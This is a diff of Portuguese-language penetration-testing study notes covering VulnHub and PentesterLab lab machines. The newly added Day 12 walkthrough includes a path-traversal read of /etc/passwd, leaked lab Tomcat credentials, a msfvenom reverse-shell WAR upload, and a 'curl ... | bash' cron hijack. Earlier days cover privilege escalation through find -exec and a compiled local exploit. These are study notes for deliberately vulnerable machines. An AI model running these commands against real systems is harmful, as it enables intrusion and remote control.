@@ -1,21 +1,24 @@
---VM--
-desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/
-desafio 2 - https://pentesterlab.com/exercises/s2-052/course
-desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/
-desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
-desafio 5 - https://www.vulnhub.com/entry/violator-1,153/
-desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/
-Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/
-Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/
-Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download
-Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
-Desafio 11 - vulnhub.com/entry/goldeneye-1,240/
-Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/
+
+#__--VM--__	<br/>
+desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/ <br/>
+desafio 2 - https://pentesterlab.com/exercises/s2-052/course	<br/>
+desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/	<br/>
+desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/	<br/>
+desafio 5 - https://www.vulnhub.com/entry/violator-1,153/	<br/>
+desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/	<br/>
+Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/		<br/>
+Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/		<br/>
+Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download	<br/>
+Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/	<br/>
+Desafio 11 - https://vulnhub.com/entry/goldeneye-1,240/	<br/>
+Desafio 12 - https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/	<br/>
 Desafio 13 - 
---VM--
-  
-#Dia 1 - desafio 2(1° desafio)     7/9/2020
-        *scan com nmap        
+<br/>#**--VM--**
+	
+	
+**Dia 1 - desafio 2(1° desafio)     7/9/2020**
+
+       *scan com nmap        
         *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
         *msfconsole -> auxiliary/admin/http/wp_google_maps_sqli
         *quebrar a hash da senha com John 
@@ -32,7 +35,8 @@ Desafio 13 -
 
 
 
-#Dia 2 - desafio 2(° 2desafio)			8/9/2020
+__#Dia 2 - desafio 2(° 2desafio)			8/9/2020__
+	
 	*Pesquisa sobre “trust” -> vulnerabilidade conhecida -> exploit encontrado: Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution
 	
 	*varredura da máquina
@@ -42,7 +46,8 @@ Desafio 13 -
 
 
 
-#Dia 3 			9/9/2020
+__#Dia 3 			9/9/2020__
+	
 	*Varredura do alvo
 		indetificação vulnerabilidade 
 			
@@ -65,7 +70,7 @@ Desafio 13 -
 			
 			
 			
-#Dia 4 			10/9/2020
+__#Dia 4 			10/9/2020__
 
 	*Varredra da máquina
 	
@@ -106,7 +111,7 @@ Desafio 13 -
 
 
 
-#Dia 5 			11/9/2020
+__#Dia 5 			11/9/2020__
 
 	*Scan básico
 		-sV -Pn  ip_alvo
@@ -145,7 +150,7 @@ Desafio 13 -
 				
 
 
-#Dia 6 			12/9/2020
+__#Dia 6 			12/9/2020__
 
 	*scan
 	
@@ -161,7 +166,7 @@ Desafio 13 -
 		
 	*ssh
 
-#Dia 7 			13/9/2020
+__#Dia 7 			13/9/2020__
 
 	*scan alvo
 	
@@ -196,7 +201,7 @@ Desafio 13 -
 			root pois está no mesmo grupo
 			
 
-#Dia 8 			14/9/2020
+__#Dia 8 			14/9/2020__
 
 	*scan padrão
 	
@@ -219,7 +224,7 @@ Desafio 13 -
 				.
 				w /etc/passwd
 
-#Dia 9 			15/9/2020
+__#Dia 9 			15/9/2020__
 	
 	*scan
 	
@@ -242,7 +247,7 @@ Desafio 13 -
 					/usr/bin/find -exec  "/bin/bash" \;
 
 
-#Dia 10			16/9/2020
+__#Dia 10			16/9/2020__
 
 *burp suite
 	repeater	-> index.php?file=about.php
@@ -275,7 +280,7 @@ Desafio 13 -
 		
 		
 
-#Dia 11 			17/9/2020
+__#Dia 11 			17/9/2020__
 
 	*scan padrão
 		porta 80
@@ -382,6 +387,80 @@ Desafio 13 -
 					compilar -> cc -o datanovo 37292.c
 						executar -> ./datanovo
 						root :)
+						
+
+
+__Dia 12 			18/9/2020__
+
+	*scan default
+	
+	*enum4linux
+	
+	*ip:8080
+		http://192.168.100.16:8080/robots.txt	
+			/tryharder/tryharder
+				*base64
+					“password”
+				
+	*smbclient \\\\192.168.100.16\\qiu -U qiu
+		-U -> user -> enum4linux -> qiu
+		pass -> password -> ...robots.txt
+		
+		*ls
+			cd .opensesame
+			get config -> baixar
+				exit
+		* Port Knocking Daemon Configuration
+		“fazer as requisições na ordem pra executar o comando do firewall e liberar a porta”
+			exemplo 1 -> nc 192.168.100.16 159 ; nc 192.168.100.16 27391 ; nc 192.168.100.16 4
+			exemplo 2 -> knock 192.168.100.16 159 27391 4 -v
+			
+				http://192.168.100.16/
+					http://192.168.100.16/robots.txt
+						http://192.168.100.16/nomercy/
+		
+			searchsploit rips 0.53
+				cat  /usr/share/exploitdb/exploits/php/webapps/18660.txt
+					http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/passwd
+					*http://192.168.100.16:8080/
+						“/etc/tomcat7/tomcat-users.xml”
+							http://192.168.100.16/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml
+					http://192.168.100.16:8080/
+					 	“manager webapp”
+							user: - thisisasuperduperlonguser
+							pass: - heartbreakisinevitable
+							
+			*msfvenom -p linux/x86/shell_reverse_tcp lhost=ip_kali lport=443 -f war -o beco.war
+				7z l beco.war
+					copiar nome **.jsp
+						upar arquivo beco.war no tomat -> WAR file to deploy -> Browse -> deploy
+							
+			*kali -> nc -lnvp 443
+			
+			*tomcat -> 192.168.100.16:8080/beco/wcsnsdcnkynqv.jsp
+			
+			*shell
+				python -c 'import pty;pty.spawn("/bin/sh")'
+				su fluffy
+				pass: freakishfluffybunny
+				
+				cd /home/fluffy
+					ls -a
+						cd .private
+						/home/fluffy/.private/secrets
+						cat timeclock
+						
+			*kali -> msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.4 lport=4444 -f raw > beco2.sh
+				vim beco2.sh
+					echo “xxxxxx” >> timeclock
+					
+					python -c 'import pty;pty.spawn("/bin/sh")'
+				
+				OBS: cd /home/fluffy/.private/secrets					
+				*nc -lnvp 4444
+				*shell curl -s http://192.168.100.4:8080/beco2.sh | bash -> vai requisitar o beco2.sh e executar o bash
+					cat timeclock
+						ultima linha, basta aguardar que a tarerfa será executa e então o comando será executado.(cromtab)
 		
 		
 		
